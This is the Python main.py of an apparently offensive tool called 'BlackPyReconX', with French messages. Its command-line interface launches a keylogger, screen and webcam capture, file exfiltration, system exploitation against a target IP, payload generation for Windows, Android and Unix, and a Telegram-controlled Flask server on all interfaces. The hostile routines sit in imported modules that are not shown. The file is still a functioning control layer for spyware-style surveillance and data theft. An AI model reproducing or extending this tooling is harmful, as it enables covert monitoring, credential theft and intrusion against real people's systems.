# main.py

import argparse
import sys
import os

# ✅ Import des modules Red Team
from modules.osint import osint_main
from modules.scanner import scan_main
from modules.exfiltration import exfiltrate_all, exfiltrate_path
from modules.exploit_sys import (
    start_keylogger, take_screenshot, capture_webcam,
    exploit_system
)
from modules.reporting import generate_report
from modules.utils import banner

# ✅ Flask pour webhook Telegram
try:
    from telegram_bot.telegram_bot import app as telegram_app
except ImportError as e:
    print(f"⚠️ Impossible d'importer le bot Telegram : {e}")
    telegram_app = None

# ✅ Répertoire racine
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

def run_cli():
    banner()

    parser = argparse.ArgumentParser(description="🕷️ BlackPyReconX - Red Team CLI")
    parser.add_argument("--target", help="Cible IP ou domaine")

    # Modules Red Team
    parser.add_argument("--osint", action="store_true", help="Effectuer un OSINT")
    parser.add_argument("--scan", action="store_true", help="Scan réseau")
    parser.add_argument("--exploit_sys", action="store_true", help="Exploitation système")
    parser.add_argument("--keylogger", action="store_true", help="Lancer le keylogger")
    parser.add_argument("--screenshot", action="store_true", help="Capture d'écran")
    parser.add_argument("--webcam", action="store_true", help="Capture webcam")
    parser.add_argument("--exfil", action="store_true", help="Exfiltration générale")
    parser.add_argument("--exfiltrate_path", help="Exfiltration d'un chemin spécifique")
    parser.add_argument("--report", action="store_true", help="Génération de rapport final")
    parser.add_argument("--webserver", action="store_true", help="Lancer le serveur Flask (Webhook Telegram)")

    # Nouvelle commande
    parser.add_argument("--set_payload", choices=["windows", "android", "unix"],
                        help="Génère un payload pour la plateforme choisie")

    args = parser.parse_args()

    try:
        if args.osint:
            if args.target:
                osint_main(args.target)
                print("✅ OSINT terminé.")
            else:
                print("❌ Veuillez fournir une cible avec --target")

        elif args.scan:
            if args.target:
                scan_main(args.target)
                print("✅ Scan réseau terminé.")
            else:
                print("❌ Veuillez fournir une cible avec --target")

        elif args.exploit_sys:
            if args.target:
                exploit_system(args.target)
                print("✅ Exploitation système terminée.")
            else:
                print("❌ Veuillez fournir une IP cible avec --target")

        elif args.keylogger:
            start_keylogger()
            print("✅ Keylogger lancé.")

        elif args.screenshot:
            take_screenshot()
            print("✅ Capture d’écran enregistrée.")

        elif args.webcam:
            capture_webcam()
            print("✅ Capture webcam enregistrée.")

        elif args.exfil:
            exfiltrate_all()
            print("✅ Exfiltration générale terminée.")

        elif args.exfiltrate_path:
            exfiltrate_path(args.exfiltrate_path)
            print(f"✅ Exfiltration de {args.exfiltrate_path} terminée.")

        elif args.report:
            generate_report()
            print("✅ Rapport final généré.")

        elif args.webserver:
            if telegram_app:
                print("🚀 Lancement du serveur Flask - Webhook Telegram actif")
                telegram_app.run(host="0.0.0.0", port=10000, debug=False)
            else:
                print("❌ Impossible de lancer le serveur Flask : bot Telegram non importé")

        elif args.set_payload:
            print(f"⚙️ Génération du payload pour {args.set_payload}...")
            os.system(f"python build/packager.py --target {args.set_payload}")

        else:
            parser.print_help()

    except Exception as e:
        print(f"❌ Erreur durant l'exécution : {e}")

if __name__ == "__main__":
    run_cli()
